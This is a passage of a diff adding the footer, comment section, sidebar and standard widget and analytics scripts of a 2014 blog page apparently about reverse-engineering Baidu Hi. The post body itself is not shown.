+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{},"image":{"viewList":["qzone","tsina","tqq","renren","weixin"],"viewText":"分享到：","viewSize":"16"},"selectShare":{"bdContainerClass":null,"bdSelectMiniList":["qzone","tsina","tqq","renren","weixin"]}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">Comments</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://l4f.club/2014/08/30/The-Research-About-Baidu-Hi/" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:l4f.club">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">Categories</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/About/">About</a><small>1</small></li>
+  
+    <li><a href="/categories/Binary/">Binary</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">Tag Cloud</h3>
+  <div class="entry">
+    <a href="/tags/Light4Freedom/" style="font-size: NaNpx;">Light4Freedom</a><a href="/tags/intro/" style="font-size: NaNpx;">intro</a><a href="/tags/百度Hi/" style="font-size: NaNpx;">百度Hi</a><a href="/tags/自由之光/" style="font-size: NaNpx;">自由之光</a><a href="/tags/逆向/" style="font-size: NaNpx;">逆向</a>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+<h3 class="title">友情链接</h3>
+<ul class="entry">
+<li><a href="http://hungiinthesky.net" title="HungI Chao">HungI Chao</a></li>
+<li><a href="http://le4f.net" title="冷夜">冷夜</a></li>
+<li><a href="http://fuckgcd.net" title="redrain">redrain</a></li>
+<li><a href="http://www.leelour.com" title="leelour">LeeLour</a></li>
+<li><a href="http://www.programlife.net/" title="Winson">Winson</a></li>
+<li><a href="http://www.reedchao.com/" title="ReeChao">ReedChao</a></li>
+</ul>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2014 John Doe
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<script type="text/javascript">
+var disqus_shortname = 'light4freedom';
+
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+</script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fab2605389f1b090a6703fe6474048157' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-53473720-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+</body>
+</html>
